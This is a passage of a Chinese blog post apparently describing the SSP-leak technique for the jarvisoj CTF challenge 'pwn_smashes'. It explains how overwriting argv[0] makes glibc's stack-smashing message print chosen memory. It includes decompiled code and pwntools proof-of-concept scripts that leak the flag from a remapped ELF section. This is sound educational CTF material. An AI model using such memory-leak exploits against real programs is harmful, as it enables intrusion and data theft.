+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 func_1()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; // rax@1</span><br><span class="line">  __int64 v1; // rbx@2</span><br><span class="line">  int v2; // eax@3</span><br><span class="line">  __int64 buffer; // [sp+0h] [bp-128h]@1</span><br><span class="line">  __int64 canary; // [sp+108h] [bp-20h]@1</span><br><span class="line"></span><br><span class="line">  canary = *MK_FP(__FS__, 40LL);</span><br><span class="line">  __printf_chk(1LL, (__int64)&quot;Hello!\nWhat&#x27;s your name? &quot;);</span><br><span class="line">  LODWORD(v0) = _IO_gets(&amp;buffer);</span><br><span class="line">  if ( !v0 )</span><br><span class="line">label_exit:</span><br><span class="line">    _exit(1);</span><br><span class="line">  v1 = 0LL;</span><br><span class="line">  __printf_chk(1LL, (__int64)&quot;Nice to meet you, %s.\nPlease overwrite the flag: &quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = _IO_getc(stdin);</span><br><span class="line">    if ( v2 == -1u )</span><br><span class="line">      goto label_exit;</span><br><span class="line">    if ( v2 == &#x27;\n&#x27; )</span><br><span class="line">      break;</span><br><span class="line">    flag[v1++] = v2;</span><br><span class="line">    if ( v1 == 32 )                             // 32长度</span><br><span class="line">      goto thank_you;</span><br><span class="line">  &#125;</span><br><span class="line">  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));</span><br><span class="line">thank_you:</span><br><span class="line">  puts(&quot;Thank you, bye!&quot;);</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ canary;</span><br></pre></td></tr></table></figure>
+
+
+<p>首先，函数使用了gets<s>(的某种形态？)</s>来获取输入，好处是我们可以输入无限长度的字符串，坏处是发送过去的字符串的尾部会以<code>\n</code>结尾，所以无法绕过canary。</p>
+<p>纵观整个程序，似乎没有什么地方能够绕过canary，也没有什么地方能打印flag。</p>
+<p>但如果你换个思路，我们故意触发canary的保护会怎么样？</p>
+<p>事实上，就有一种攻击方法叫做<code>SSP（Stack Smashing Protector ） leak</code>。</p>
+<hr>
+<p>如果canary被我们的值覆盖而发生了变化，程序会执行函数<code>___stack_chk_fail()</code></p>
+<p><img src="/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/canary_7a0eddd01d532e95ac8a905e617c70b4.png"></p>
+<p>一般情况下，我们执行了这个函数，输出是这样的：</p>
+<p><img src="/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/canary_c0f71a7d08460009b1ff313dcdbf0294.png"></p>
+<p>我们来看一下源码<br>__stack_chk_fail :</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> </span><br><span class="line">__attribute__ ((noreturn)) </span><br><span class="line">__stack_chk_fail (<span class="type">void</span>) &#123;   </span><br><span class="line">	__fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>fortify_fail </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> </span><br><span class="line">__attribute__ ((noreturn)) </span><br><span class="line">__fortify_fail (msg)</span><br><span class="line">   <span class="type">const</span> <span class="type">char</span> *msg; &#123;</span><br><span class="line">      <span class="comment">/* The loop is added only to keep gcc happy. */</span></span><br><span class="line">         <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">              __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>, msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>) </span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">libc_hidden_def</span> (__fortify_fail)</span><br></pre></td></tr></table></figure>
+
+<p>可见，__libc_message 的第二个<code>%s</code>输出的是argv[0]，argv[0]是指向第一个启动参数字符串的指针，而在栈中，大概是这样一个画风</p>
+<p><img src="/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/canary_a768142147ca3976598941b5c6c67161.png"></p>
+<p>所以，只要我们能够输入足够长的字符串覆盖掉argv[0]，我们就能让canary保护输出我们想要地址上的值。</p>
+<p>听起来很美妙，我们可以试试看。</p>
+<p>先写如下poc:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cn = remote(&#x27;pwn.jarvisoj.com&#x27;, 9877)</span></span><br><span class="line">cn = process(<span class="string">&#x27;pwn_smashes&#x27;</span>)</span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline(p64(<span class="number">0x0000000000400934</span>)*<span class="number">200</span>) <span class="comment">#直接用我们所需的地址占满整个栈</span></span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline()</span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#.rodata:0000000000400934 aHelloWhatSYour db &#x27;Hello!&#x27;,0Ah         ; DATA XREF: func_1+1o</span></span><br><span class="line"><span class="comment">#.rodata:0000000000400934                 db &#x27;What&#x27;,27h,&#x27;s your name? &#x27;,0</span></span><br><span class="line"><span class="comment">#.rodata:000000000040094E ; char s[]</span></span><br><span class="line"><span class="comment">#.rodata:000000000040094E s               db &#x27;Thank you, bye!&#x27;,0  ; DATA XREF: func_1:loc_400878o</span></span><br><span class="line"><span class="comment">#.rodata:000000000040095E                 align 20h</span></span><br><span class="line"><span class="comment">#.rodata:0000000000400960 aNiceToMeetYouS db &#x27;Nice to meet you, %s.&#x27;,0Ah</span></span><br><span class="line"><span class="comment">#.rodata:0000000000400960                                         ; DATA XREF: func_1+3Fo</span></span><br><span class="line"><span class="comment">#.rodata:0000000000400960                 db &#x27;Please overwrite the flag: &#x27;,0</span></span><br><span class="line"><span class="comment">#.rodata:0000000000400992                 align 8</span></span><br><span class="line"><span class="comment">#.rodata:0000000000400992 _rodata         ends</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果令我们满意</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x56 bytes:</span><br><span class="line">    <span class="string">&#x27;Thank you, bye!\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;*** stack smashing detected ***: Hello!\n&#x27;</span></span><br><span class="line">    <span class="string">&quot;What&#x27;s your name?  terminated\n&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是，当我们把地址换成flag的地址时，却可以发现flag并没有被打印出来，那是因为在func_1函数的结尾处有这样一句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));</span><br></pre></td></tr></table></figure>
+
+<p>所以，无论如何，等我们利用canary打印flag的时候，0x600D20上的值已经被完全覆盖了，因此我们无法从0x600D20处得到flag。</p>
+<p>这就是这道题的第二个考点，ELF的重映射。当可执行文件足够小的时候，他的不同区段可能会被多次映射。这道题就是这样。</p>
+<p><img src="/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/canary_b17d7868f95d135b35908e74805b7282.png"></p>
+<p>可见，其实在0x400d20处存在flag的备份。</p>
+<p>因此，最终的poc为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">cn = remote(<span class="string">&#x27;pwn.jarvisoj.com&#x27;</span>, <span class="number">9877</span>)</span><br><span class="line"><span class="comment">#cn = process(&#x27;pwn_smashes&#x27;)</span></span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline(p64(<span class="number">0x0400d20</span>)*<span class="number">200</span>)</span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline()</span><br><span class="line">cn.recv()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%88%E8%AF%B4%E8%AF%B4canary"><span class="toc-number">1.</span> <span class="toc-text">先说说canary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87canary-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">2.</span> <span class="toc-text">绕过canary - 格式化字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87canary-%E9%92%88%E5%AF%B9fork%E7%9A%84%E8%BF%9B%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">绕过canary - 针对fork的进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%85%E6%84%8F%E8%A7%A6%E5%8F%91canary-ssp-leak"><span class="toc-number">4.</span> <span class="toc-text">故意触发canary - ssp leak</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/&text=论canary的几种玩法"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/&title=论canary的几种玩法"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/&is_video=false&description=论canary的几种玩法"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=论canary的几种玩法&body=Check out this article: https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/&title=论canary的几种玩法"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/&title=论canary的几种玩法"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/&title=论canary的几种玩法"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/&title=论canary的几种玩法"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/&name=论canary的几种玩法&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/&t=论canary的几种玩法"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    veritas501
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
